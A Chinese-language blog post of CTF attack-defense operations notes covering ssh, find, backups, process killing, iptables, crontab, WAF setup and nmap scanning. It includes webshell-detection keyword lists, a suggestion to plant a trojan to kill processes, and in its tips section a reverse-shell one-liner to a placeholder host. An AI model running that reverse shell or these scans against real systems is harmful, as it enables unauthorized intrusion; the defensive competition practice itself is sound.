---
title: ctf运维的基本操作
date: 2017-12-09 14:53:50
categories: 运维
tags: 运维
---

### 1、ssh相关操作

启动ssh（root亦可登录）

```
service sshd start
vi /etc/ssh/sshd_config
- 取消PasswordAuthentication yes的注释
- 将#PermitRootLogin prohibit-password后加入一行PermitRootLogin yes
service sshd restart
```

ssh登录

```
xshell登录
- ssh [user@]host[ port][;host[ port]]
- ssh root@172.168.12.13 22   //进入界面中设置用户名、密码
- ssh 172.168.12.13  ;172.168.12.13 22  //console中设置用户名和密码

linux中ssh登录
- ssh root@172.168.12.13 -p 22
```

ssh文件传输

```
xshell下载（最好是配合Xftp）

命令下载（scp）
- scp local_file remote_username@remote_ip:remote_folder 
- scp remote_username@remote_ip:remote_file local_file 
- scp -r local_folder remote_username@remote_ip:remote_folder 
- scp -r remote_username@remote_ip:remote_folder local_folder
```

### 2、vim常用修改

#### 2.1 影响范围

当前文件

```
:命令
```

当前用户的文件

```
vim ~/.vimrc
命令
```

所有用户的文件

```
vim /etc/vim/vimrc

命令
```

#### 2.2 常用命令

显示行号

```
:set nu或者:set number
```

不显示行号

```
:set nonu 或者:set nonumber
```

设置tab长度

```
:set tabstop=4
```

设置文件格式

```
:set fileformat=unix或者:set ff=unix
:set fileformat=dos或者:set ff=dos
```

### 3、find指令

查找文件类型

```
find . -type f -name *.php
```

查找某种权限的文件及文件夹

```
-perm(permission)
- -perm mode：精确匹配权限
- -perm -mode：完全包含此mode时才可以匹配
- -perm +mode：任何一位匹配即可
```

```
a权限转为2进制后为 000 110 000 000 (0600)
b权限转为2进制后为 000 010 000 000 (0200)
c权限转为2进制后为 000 100 000 000 (0400)
d权限转为2进制后为 000 110 110 000 (0660)

1. 在find . -type f -perm -0600 中的0600权限转为2进制为000 110 000 000,那么0600前的-号代表缺一不可,也就是如果有1的地方必须有1,那么这里找-0600权限的文件,这0600权限里前面有2个位置都是1,所以这里find找-0600权限的文件就是找第4、5位都是1的文件.而只有a d这两个文件前2个位置都是1,所以find . -type f -perm -0600 只会找到a d两个文件.
2. find . -type f -perm +0600会找到a b c d这4个文件,这是因为: 
   +0600 里的这个+号代表有1即可,也就是有1的位置，任何位置只要有1就可以.那么这里找+0600权限的文件,这0600权限第4、5位都有1,所以这里find 找+0600权限的文件就是找第4、5位只要有一个位置有1的文件就可以了,这4个文件都符合要求所以最后都能被 find . -type f -perm +0600找到
```

多种条件并列查找

```
find / -type f  -perm -04000 -o -perm -02000		// 或关系

find / -type f  -perm -04000 -a -perm -02000		// 与关系
```

查找符合某些特征的文件

```
# 找php木马
find / -type f -name *.php | xargs egrep -l "mysql_query\($query, $dbconn\)|专用网马|udf.dll|class PHPzip\{|ZIP压缩程序 荒野无灯修改版|$writabledb|AnonymousUserName|eval\(|Root_CSS\(\)|黑狼PHP木马|eval\(gzuncompress\(base64_decode|if\(empty\($_SESSION|$shellname|$work_dir |PHP木马|Array\("$filename"| eval\($_POST\[|class packdir|disk_total_space|wscript.shell|cmd.exe|shell.application|documents and settings|system32|serv-u|提权|phpspy|后门"

# 找jsp木马
find / -type f -name *.jsp | xargs egrep -l "InputStreamReader\(this.is\)|W_SESSION_ATTRIBUTE|strFileManag|getHostAddress|wscript.shell|gethostbyname|cmd.exe|documents and settings|system32|serv-u|提权|jspspy|后门"

# 找HTML恶意代码
find / -type f -name *.html | xargs egrep -l "WriteData|svchost.exe|DropPath|wsh.Run|WindowBomb|a1.createInstance|CurrentVersion|myEncString|DropFileName|a = prototype;|204.351.440.495.232.315.444.550.64.330"

# 找perl恶意程序
find / -type f -name *.pl | xargs egrep -l "SHELLPASSWORD|shcmd|backdoor|setsockopt|IO::Socket::INET;"

# 找python恶意程序
find / -type f -name *.py | xargs egrep -l "execCmd|cat /etc/issue|getAppProc|exploitdb"

# 检查系统是否存在恶意程序
find / -type f -perm -111  |xargs egrep "UpdateProcessER12CUpdateGatesE6C|CmdMsg\.cpp|MiniHttpHelper.cpp|y4'r3 1uCky k1d\!|execve@@GLIBC_2.0|initfini.c|ptmalloc_unlock_all2|_IO_wide_data_2|system@@GLIBC_2.0|socket@@GLIBC_2.0|gettimeofday@@GLIBC_2.0|execl@@GLIBC_2.2.5|WwW.SoQoR.NeT|2.6.17-2.6.24.1.c|Local Root Exploit|close@@GLIBC_2.0|syscall\(\__NR\_vmsplice,|Linux vmsplice Local Root Exploit|It looks like the exploit failed|getting root shell" 2>/dev/null
```

### 4、tar指令

打包文件

```
tar zcvf /tmp/www.tgz /var/www/html
```

解压文件

```
tar zxvf /tmp/www.tgz -C /tmp/
```

不同类型的压缩文件相关参数

```
1、*.tar 用 tar –xvf 解压
2、*.gz 用 gzip -d或者gunzip 解压
3、.tar.gz和.tgz 用 tar –xzf 解压
4、*.bz2 用 bzip2 -d或者用bunzip2 解压
5、*.tar.bz2用tar –xjf 解压
6、*.Z 用 uncompress 解压
7、*.tar.Z 用tar –xZf 解压
8、*.rar 用 unrar e解压
9、*.zip 用 unzip 解压
```

### 5、备份

网站备份

> 利用上述tar命令将文件进行打包备份

sql备份

> sql备份需要相关工作者，分析网站系统，并得到sql服务器密码，通过相应指令进行备份。

```
备份数据库
- mysqldump -u 用户名 -p 密码 数据库名 > bak.sql
- mysqldump --all-databases > bak.sql

还原数据库
- mysql -u 用户名 -p 密码 数据库名 < bak.sql
```

### 6、杀死进程

web服务进程分两种，一种是运维者的进程，一种为攻击者的进程。攻击者的进程一般是恶意进程，而且运维者并没有权限杀死改进程。为了杀死这些www-data用户的进程，我们应该在服务器上挂个马，然后通过网络访问的方式删除木马、杀死僵尸进程等。

```
用户用ssh偷偷连接web服务器
- w
- pkill -kill -t <用户tty>
```

```
查看所有的进程
- ps aux
- ps -ef

查看某个用户的进程
- ps -f -u www-data

查看已建立的网络连接及进程
- netstat -antulp | grep EST

查看指定端口被那个进程占用
- lsof -i:端口号
- netstat -tunlp|grep 端口号
```

```
结束进程
- kill PID		  // 只能是PID
- killall <进程名>  // 只能是进程名
- kill -9 PID          // 此处的9是signal，代表SIGKILL
- killall -u www-data   //杀死www-data的所有进程

找反弹的shell进程
ps aux|grep "bash -i"
```

### 7、iptables设置

其实主办方一般不会给iptables的相关权限，毕竟给了这个权限之后就没法玩了。

```
#Allow youself Ping other hosts , prohibit others Ping you
iptables -A INPUT -p icmp --icmp-type 8 -s 0/0 -j DROP
iptables -A OUTPUT -p icmp --icmp-type 8 -s 0/0 -j ACCEPT

#Close all INPUT FORWARD OUTPUT, just open some ports
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

#Open ssh
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT

#ip prohibit
iptables -A INPUT -p tcp --dport 80 -s 172.16.0.86 -j DROP
```

### 8、crontab设置

作为维护者，为了方便自己定时检查数据内容，我们可以写个程序，利用crontab定时检查！

作为攻击者，为了让维护者无法完全杀死自己，其可以起一个crontab定时程序，让服务器定时反弹shell或者执行木马程序。

关于crontab的使用，可以参见以前的博文 [crontab指令介绍](/2017/11/26/crontab指令介绍/)

```
显示某个用户的crontab文件内容
crontab -l -u user

删除crontab内容
crontab -r -u user
```

### 9、挂waf的相关操作

一般情况下，系统不会立马被人攻陷，所以运维者至少有10分钟的时间可以维护主机。那么这段时间应该做些什么？

> 首先将网站备份，并上传waf、file_check等必要工具；
>
> 然后挂上waf。将waf放置到/tmp目录下，并给waf、waf/log/、waf/log_all/ 以及相应的文件777权限，然后配置好setup.py、waf.php，最后执行python setup.py；
>
> 其次就是启动file_check程序。将file_check放置到/tmp目录下，配置file_check.py，执行python file_check.p；;
>
> 最后将sql备份(不一定是必须的，因为sql不一定有。之所以将其放置到最后，是因为从代码中l找到sql密码较为耗时间！)，并将网站备份、sql备份下载至本地。

### 10、扫描网络

扫描网络在闲暇比赛中其实很重要。首先，你需要将目标网段确定，一般就是一个/24的网段，可能存在的服务器不会超过256台。但是，仅仅这个数量其实也挺多的。

```
#扫描指定端口
nmap -n --open -p 80 X.X.X.X/24

#扫描指定网段的远程桌面连接端口
nmap -sT -p3389 218.206.112.0/24

#使用nmap来扫描端口UDP
nmap -sU 202.96.128.86 -p 53 -Pn

#进行安全检测(全端口扫描)
nmap -v -A 219.129.216.156

#仅列出指定网络上的每台主机，不发送任何报文到目标主机（能够得到相应的域名）
nmap -sL 192.168.1.0/24

#探测目标主机开放的端口，可以指定一个以逗号分隔的端口列表(如-PS22，23，25，80)
nmap -PS 192.168.1.234 

#使用UDP ping探测主机
nmap -PU 192.168.1.0/24

#使用频率最高的扫描选项：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快
nmap -sS 192.168.1.0/24 

#当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描
nmap -sT 192.168.1.0/24 

#UDP扫描用-sU选项,UDP扫描发送空的(没有数据)UDP报头到每个目标端口
nmap -sU 192.168.1.0/24 

#确定目标机支持哪些IP协议 (TCP，ICMP，IGMP等)
nmap -sO 192.168.1.19

#探测目标主机的操作系统
nmap -O 192.168.1.19 
nmap -A 192.168.1.19 

#进行ping扫描，打印出对扫描做出响应的主机,不做进一步测试(如端口扫描或者操作系统探测)
nmap -sP 192.168.1.0/24
```

上述是基本操作，配合grep、awk可以得到更为玄妙的结果

```
#扫描指定网段的指定端口，并输出至ip.data
nmap -n --open -p 80 10.254.20.0/24 | grep -B3 "80/tcp"|grep "report for"|awk '{print $5}' >> ip.data
```

类似地，我们可以通过nmap的扫描结果，提取出需要的内容。

### 11、常用技巧

反弹shell

```
bash -i >& /dev/tcp/x.x.x.x/2333 0>&1
```

运行crontab

```
crontab cronfile
```